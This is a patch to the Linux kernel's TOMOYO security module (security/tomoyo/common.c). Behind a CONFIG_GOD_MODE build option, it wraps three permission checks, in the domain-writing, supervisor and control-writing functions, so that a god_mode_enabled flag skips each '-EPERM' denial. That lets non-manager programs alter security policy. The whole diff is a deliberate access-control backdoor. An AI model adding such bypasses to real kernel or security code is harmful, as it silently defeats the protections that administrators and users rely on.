@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * security/tomoyo/common.c
  *
@@ -860,7 +863,15 @@ static int tomoyo_write_domain(struct tomoyo_io_buffer *head)
 		return 0;
 	/* Don't allow updating policies by non manager programs. */
 	if (!tomoyo_manager())
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (tomoyo_domain_def(data)) {
 		domain = NULL;
 		if (is_delete)
@@ -1546,7 +1557,15 @@ int tomoyo_supervisor(struct tomoyo_request_info *r, const char *fmt, ...)
 	if (!r->domain)
 		r->domain = tomoyo_domain();
 	if (!atomic_read(&tomoyo_query_observers))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	va_start(args, fmt);
 	len = vsnprintf((char *) &pos, sizeof(pos) - 1, fmt, args) + 32;
 	va_end(args);
@@ -1985,7 +2004,15 @@ int tomoyo_write_control(struct file *file, const char __user *buffer,
 	/* Don't allow updating policies by non manager programs. */
 	if (head->write != tomoyo_write_pid &&
 	    head->write != tomoyo_write_domain && !tomoyo_manager())
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (mutex_lock_interruptible(&head->io_sem))
 		return -EINTR;
 	/* Read a line and dispatch it to the policy handler. */
